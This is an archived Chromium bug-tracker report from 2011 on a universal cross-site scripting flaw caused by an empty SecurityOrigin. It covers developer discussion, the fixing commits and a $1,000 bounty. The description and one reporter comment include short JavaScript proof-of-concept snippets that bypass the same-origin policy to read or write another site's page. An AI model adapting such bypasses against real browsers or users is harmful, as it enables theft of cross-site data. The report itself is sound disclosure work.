# UXSS with empty SecurityOrigin

| Field | Value |
|-------|-------|
| **Issue ID** | [40092672](https://issues.chromium.org/issues/40092672) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | se...@gmail.com |
| **Assignee** | ab...@chromium.org |
| **Created** | 2011-07-15 |
| **Bounty** | $1,000.00 |

## Description

A page with an empty SecurityOrigin could be used to bypass the same origin policy restrictions.

Chrome doesn't clear the v8 context when navigating from such pages:
w = open("http://google.com");
f = w.Function;
setTimeout(function(){alert(f("return document.documentElement.innerHTML")())}, 5000);

void DocumentWriter::begin(const KURL& url, bool dispatch, SecurityOrigin* origin)
{
...
    bool resetScripting = !(m_frame->loader()->stateMachine()->isDisplayingInitialEmptyDocument() && m_frame->document()->securityOrigin()->isSecureTransitionTo(url));
    m_frame->loader()->clear(resetScripting, resetScripting);

and securityOrigin::isSecureTransitionTo() is always true for the empty securityOrigin.

It's also possible to apply open() to an attack target window
(This will replace the securityOrigin of an existing window with the target's one):
w = open("http://google.com");
w2 = open("about:blank", "wnd");
setTimeout(function()
{
	f = w2.Function;
	open.call(w, null, "wnd");
	setTimeout(function() { f('opener.document.write("foo")')() }, 1000);
}, 5000);

void Document::initSecurityContext()
{
...
    Frame* ownerFrame = m_frame->tree()->parent();
    if (!ownerFrame)
        ownerFrame = m_frame->loader()->opener();

    if (ownerFrame) {
...
        ScriptExecutionContext::setSecurityOrigin(ownerFrame->document()->securityOrigin());
...


The following comment describes how an attacker could get access to an empty SecurityOrigin window.
bool BindingSecurityBase::canAccess(DOMWindow* activeWindow, DOMWindow* targetWindow)
{
...
    // Allow access to a "about:blank" page if the dynamic context is a
    // detached context of the same frame as the blank page.
    if (targetSecurityOrigin->isEmpty() && activeWindow->frame() == targetWindow->frame())
        return true;
...
}

in JavaScript:
w = open(location);
setTimeout(function()
{
	f = w.Function;
	w.opener = null;
	w.eval('location = "about:blank"');
	setTimeout(function() { f('window.document.write("foo")')() }, 1000);
}, 1000);

The full repro is attached (and looks terrible).


## Attachments

- [uxss.html](attachments/uxss.html) (text/html; charset=us-ascii, 1008 B)

## Timeline

### sc...@gmail.com (2011-07-15)

Good to see you again Sergey :)
Adam, do you think we can knock this out for M13? (Merge deadline Tuesday)


### sc...@gmail.com (2011-07-15)

@serg: also, does this affect all versions of Chrome?

### se...@gmail.com (2011-07-15)

Yeah, it does. Tested on trunk and stable.

### sc...@gmail.com (2011-07-15)

@serg.glazunov: although I assigned this to Adam, I thought I'd ask if you had any interest in fixing it yourself? This, of course, tends to increase any reward :)
We are on a bit of a deadline to get this in to Chrome 13, though...

### ab...@chromium.org (2011-07-15)

We should only do a secure transition if the two origins are the same.  In these cases, the origins change.

### se...@gmail.com (2011-07-15)

@scarybeasts I'd like Adam to take this. I have another one I'm going to fix.

### sc...@gmail.com (2011-07-15)

@abarth @serg, one each, sounds fair :P

### in...@chromium.org (2011-07-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-07-16)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-07-17)

Thanks for fixing the other one, Serg!
Fancy taking a swing at this one too? :P

### ab...@chromium.org (2011-07-17)

The simple repro doesn't work for me, but the complex one attached does.  Investigating.

### ab...@chromium.org (2011-07-17)

Doesn't seem to reproduce in Safari.  Also the line:

        w.opener = null;

Seems to be essential.  I wonder if this is related to our trying to put disconnected popups in their own process.

### se...@gmail.com (2011-07-17)

@abarth without this line an "about:blank" window gets a non-empty SecurityOrigin from the opener

### ab...@chromium.org (2011-07-17)

Ah.  I understand.  Thanks.

Have you been able to reproduce in Safari?

### ab...@chromium.org (2011-07-17)

But yeah.  Once you've got script running in an empty origin, we're in trouble.  It's just a mater of mechanism.  We should prevent you from getting script into an empty origin in the first place.

### ab...@chromium.org (2011-07-17)

For context, Sergey, the reason we don't clear JS out of an empty origin is to support other users of WebKit who both kick off a load and dump a bunch of stuff into an empty WebView.  They expect that stuff to be there when the load completes.  I think we actually do that in Chrome, at least in a number of tests.  We tried tightening that at some point, and it was a train wreck.  Instead, we prevent web content from dumping stuff into an empty origin.  (At least, that's the idea.)

### se...@gmail.com (2011-07-17)

Ouch, I read your previous comment as "doesn't seem to be essential".

In Safari this seems to work:
w=open();w2=open();w.close();f=w2.eval("(function(){return window.alert()})");w2.eval('location="about:blank"');

But it should be mitigated by the popup blocker, right?

### ab...@chromium.org (2011-07-17)

> But it should be mitigated by the popup blocker, right?

We should still be secure even if the user turns off their popup blocker.  :)

### ab...@chromium.org (2011-07-17)

Ok.  I got it to repro in Safari.

### se...@gmail.com (2011-07-17)

I've found out when the code allowing a detached context to access the empty origin from the same frame was introduced.
http://src.chromium.org/viewvc/chrome/trunk/src/webkit/port/bindings/v8/v8_proxy.cpp?annotate=3785&pathrev=19487#l1654

Can you tell me what it's supposed to be used for?

### ab...@chromium.org (2011-07-17)

> Can you tell me what it's supposed to be used for?

We really should remove that code.  I think it was motivated by a case involving plug-ins, but I'm not sure it serves any useful purpose anymore.

### se...@gmail.com (2011-07-18)

@abarth Sorry, I was wrong about Safari.
It uses JSDOMWindowBase::allowsAccessFromPrivate instead of BindingSecurityBase::canAccess and is not affected by this issue.

### ab...@chromium.org (2011-07-18)

https://bugs.webkit.org/show_bug.cgi?id=64735

### ab...@chromium.org (2011-07-25)

I can't get this to reproduce on TOT.  Are you sure this isn't the same bug as https://bugs.webkit.org/show_bug.cgi?id=64651 ?

### ab...@chromium.org (2011-07-25)

I get the following error message in the first popup:

Unsafe JavaScript attempt to access frame with URL http://www.google.com/ from frame with URL about:blank. Domains, protocols and ports must match.
about:blank:2Uncaught TypeError: Cannot read property 'documentElement' of undefined

### sc...@gmail.com (2011-07-28)

Committed r91957: <http://trac.webkit.org/changeset/91957>

We'll put this in the M13 patch.


### sc...@gmail.com (2011-07-29)

Great bug Serg, certainly a $1000 bug, keep these UXSS coming if you can find any more!

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-07-29)

First step: merged to M14 for baking in next dev release.
http://trac.webkit.org/changeset/92027

### sc...@gmail.com (2011-08-04)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-08-05)

Merged to M13: http://trac.webkit.org/changeset/92510

### sc...@gmail.com (2011-08-16)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed.. 

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### gl...@google.com (2019-03-15)

[Empty comment from Monorail migration]

### is...@google.com (2019-03-15)

This issue was migrated from crbug.com/chromium/89453?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092672)*
